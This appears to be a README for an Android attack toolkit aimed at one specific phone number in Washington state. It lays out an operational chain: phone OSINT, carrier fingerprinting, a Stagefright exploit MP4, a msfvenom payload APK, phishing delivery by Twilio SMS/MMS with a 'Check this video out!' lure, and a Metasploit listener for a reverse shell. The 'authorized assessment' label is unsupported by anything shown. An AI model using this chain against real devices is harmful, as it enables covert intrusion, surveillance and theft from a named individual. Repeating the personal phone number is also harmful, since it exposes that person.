# Android Assessment Toolkit

**Authorized Security Assessment Tool — For Ethical Hacking Use Only**

A modular toolkit for Android device security assessment targeting +1-509-614-9539 (Washington state, US).

## Attack Vectors

### Vector 1: Stagefright (Zero-Click) — CVE-2015-1538
- **Target**: Android < 6.0 (unpatched)
- **Method**: MMS delivery of crafted MP4 (libstagefright integer overflow in stsc atom)
- **Zero-click**: Exploit triggers on media processing — no user interaction required
- **Caveat**: Only works on outdated Android versions

### Vector 2: SMS Phishing APK (One-Click)
- **Target**: Modern Android devices
- **Method**: Social engineering via SMS with a malicious APK download link
- **Requires**: Publicly hosted APK + user clicking the link and installing

## Prerequisites

- Python 3.8+
- Metasploit Framework (`msfvenom`, `msfconsole`)
- Twilio account (for SMS/MMS delivery)
- Public IP / VPS (for handler and/or APK hosting)
- Public URL for MMS media attachments

## Quick Setup

```bash
chmod +x setup.sh
./setup.sh

## ========================================================
export TWILIO_ACCOUNT_SID="your_account_sid"
export TWILIO_AUTH_TOKEN="your_auth_token"
export TWILIO_FROM_NUMBER="+1XXXXXXXXXX"
export MSF_HOST="your_vps_ip"
export MSF_PORT="4444"
export MEDIA_URL="https://your-server.com/exploit.mp4"
## ========================================================

---

# Module Usage

## 1. Phone OSINT Recon
    bash

    python3 phone_osint.py +15096149539

## 2. Carrier Fingerprinting
bash

python3 carrier_fingerprint.py +15096149539

## 3. Generate Stagefright MP4
bash

python3 stagefright_mp4.py --lhost YOUR_IP --lport 4444 -o exploit.mp4

## 4. Generate Payload APK
bash

./gen_payload.sh YOUR_IP 4444

## 5. Send via SMS/MMS
bash

python3 sms_delivery.py +15096149539 \
  --media https://your-server.com/exploit.mp4 \
  --message "Check this video out!"

## 6. Start Metasploit Listener
bash

./start_listener.sh YOUR_IP 4444

## Full Assessment (One-Shot)
bash

./scripts/full_assessment.sh +15096149539 YOUR_IP 4444